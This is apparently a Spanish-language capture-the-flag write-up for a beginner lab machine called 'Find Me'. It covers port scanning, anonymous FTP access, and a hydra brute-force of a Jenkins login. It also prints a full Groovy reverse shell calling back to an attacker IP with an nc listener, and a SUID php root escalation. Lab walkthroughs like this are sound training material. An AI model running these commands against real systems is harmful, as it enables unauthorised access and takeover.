---
description: '🔍 Dificultad: Principiante'
---

# Find Me

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.91
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.91 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 21** perteneciente al **servicio FTP, puerto 22** perteneciente al **servicio SSH,** el **puerto 80** perteneciente al **servicio HTTP** y el **puerto 8080** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p21,22,80,8080 -v 192.168.1.91
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Ingresamos la IP y nos encontramos la página de por defecto de **Apache**.&#x20;

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ingresamos la IP pero a través del **puerto 8080** y nos encontramos con el panel de login de **Jenkins**.

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al realizar el escaneo encontramos que tenemos acceso anónimo a través de FTP por lo que indagaremos si hay algo relevante. Vemos una nota de `ayuda.txt` por lo que nos la descargamos.

```bash
ftp 192.168.1.91
ls
get ayuda.txt
```

Al mostrar el contenido encontramos un usuario llamado **geralt**. Nos da pistas de lo que recuerda por lo que creamos un diccionario con las distintas posibilidades a tavés de **Crunch**.

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
crunch 5 5 -t p@@@a -o diccionario.txt
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Ingresamos el usuario descubierto con una contraseña cualquiera y al inspeccionar la pagina en **Network** cogemos la distinta informacion para realizar el ataque de fuerza bruta.

```bash
hydra -l geralt -P diccionario.txt 192.168.1.91 -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=:c=/login:Invalid username or password" -f -V
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

Iniciamos sesión en **Jenkins** con las credenciales.

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

Seleccionamos **manage jenkin**s y luego **script console** que nos permite enviar una reverse shell mediante **Groovy** mediante nos ponemos en escucha.

```bash
String host="192.168.1.50";int port=443;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```bash
nc -nvlp 443
```

<figure><img src="../../.gitbook/assets/image (751).png" alt=""><figcaption></figcaption></figure>

Hacemos tratamiento de la TTY. Nos cambiamos de usuario a **geralt**.

<figure><img src="../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. Requiere contraseña.&#x20;

Buscamos archivos con permisos **SUID**.

```bash
find / -perm -4000 -ls 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (756).png" alt=""><figcaption></figcaption></figure>

Buscamos en la página [GTFObins](https://gtfobins.github.io/gtfobins/php/).

```bash
/usr/bin/php8.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```

<figure><img src="../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>

Ya somos **root**.&#x20;

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
